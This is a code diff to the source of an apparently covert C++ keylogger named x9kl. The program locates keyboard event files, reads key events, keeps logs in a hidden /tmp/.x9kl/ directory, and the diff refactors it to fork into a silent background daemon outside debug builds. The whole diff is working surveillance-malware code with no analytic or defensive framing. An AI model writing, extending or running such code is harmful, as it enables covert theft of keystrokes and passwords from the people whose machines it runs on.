@@ -9,9 +9,6 @@
 #include <cstring>
 #include <ctime>
 #include <fstream>
-#ifdef DEBUG
-#include <iostream>
-#endif  // DEBUG
 #include <map>
 #include <regex>
 #include <stdexcept>
@@ -21,11 +18,11 @@
 #define LOGS_DIRECTORY "/tmp/.x9kl/"
 
 #ifdef DEBUG
-#define X9_LOG(...)   std::fprintf(stdout, __VA_ARGS__)
-#define X9_ERROR(...) std::fprintf(stderr, __VA_ARGS__)
+#define X9KL_LOG(...)   std::fprintf(stdout, __VA_ARGS__)
+#define X9KL_ERROR(...) std::fprintf(stderr, __VA_ARGS__)
 #else
-#define X9_LOG(...)
-#define X9_ERROR(...)
+#define X9KL_LOG(...)
+#define X9KL_ERROR(...)
 #endif  // DEBUG
 
 struct x9kl_ctx_t {
@@ -124,7 +121,7 @@ static std::vector<std::string> get_event_files(void) {
       std::smatch match;
 
       if (std::regex_search(line, match, kb_regex)) {
-        X9_LOG("keyboard found, event file: '%s'\n", match[1].str());
+        X9KL_LOG("keyboard found, event file: '%s'\n", match[1].str());
         content.emplace_back(match[1]);
       }
     }
@@ -159,7 +156,7 @@ static int initialize_ctx(x9kl_ctx_t *ctx) {
   ctx->kb_fds = get_keyboard_fds();
 
   if (ctx->kb_fds.empty()) {
-    X9_ERROR("no keyboards found\n");
+    X9KL_ERROR("no keyboards found\n");
     return 1;
   }
 
@@ -284,7 +281,7 @@ void run(x9kl_ctx_t *ctx) {
         int n_bytes = read(fd, &ev, sizeof(struct input_event));
 
         if ((ev.type == EV_KEY) && (n_bytes > 0)) {
-          X9_LOG("event received for key '%d'\n", ev.code);
+          X9KL_LOG("event received for key '%d'\n", ev.code);
 
           try {
             auto ev_handler = handlers.at(ev.code);
@@ -292,41 +289,67 @@ void run(x9kl_ctx_t *ctx) {
             ctx->event = ev;
             ev_handler.cb(ctx);
           } catch (const std::out_of_range &e) {
-            X9_ERROR("no event handler for key %d\n", ev.code);
+            X9KL_ERROR("no event handler for key %d\n", ev.code);
           }
         }
       }
     }
   }
 
-  X9_LOG("finishing daemon\n");
+  X9KL_LOG("finishing daemon\n");
 }
 
-int main(void) {
-#ifndef DEBUG
-  if (!fork()) {
-#endif  // DEBUG
-    x9kl_ctx_t ctx;
+static void run(void) {
+  x9kl_ctx_t ctx;
 
-#ifdef DEBUG
-    std::setvbuf(stdout, nullptr, _IONBF, 0);
-    std::setvbuf(stderr, nullptr, _IONBF, 0);
-#endif  // DEBUG
+  if (initialize_ctx(&ctx)) {
+    X9KL_ERROR("fail to initialize the context\n");
+    std::exit(EXIT_FAILURE);
+  }
 
-    if (initialize_ctx(&ctx)) {
-      X9_ERROR("fail to initialize the context\n");
+  std::signal(SIGINT, sig_handler);
+  std::signal(SIGKILL, sig_handler);
+  std::signal(SIGTERM, sig_handler);
+  std::signal(SIGQUIT, sig_handler);
+
+  run(&ctx);
+  destroy_ctx(&ctx);
+}
+
+static void run_as_daemon(void) {
+  pid_t pid, sid;
+
+  pid = fork();
+  if (pid == -1) {
+    std::exit(EXIT_FAILURE);
+  } else if (pid > 0) {
+    std::exit(EXIT_SUCCESS);
+  } else {
+    umask(0);
+
+    sid = setsid();
+    if (sid < 0) {
       std::exit(EXIT_FAILURE);
     }
 
-    std::signal(SIGINT, sig_handler);
-    std::signal(SIGKILL, sig_handler);
-    std::signal(SIGTERM, sig_handler);
-    std::signal(SIGQUIT, sig_handler);
+    chdir("/");
 
-    run(&ctx);
-    destroy_ctx(&ctx);
-#ifndef DEBUG
+    //std::fclose(stdin);
+    //std::fclose(stdout);
+    //std::fclose(stderr);
+
+    run();
   }
+}
+
+int main(void) {
+#ifdef DEBUG
+  std::setvbuf(stdout, nullptr, _IONBF, 0);
+  std::setvbuf(stderr, nullptr, _IONBF, 0);
+
+  run();
+#else
+  run_as_daemon();
 #endif  // DEBUG
 
   std::exit(EXIT_SUCCESS);
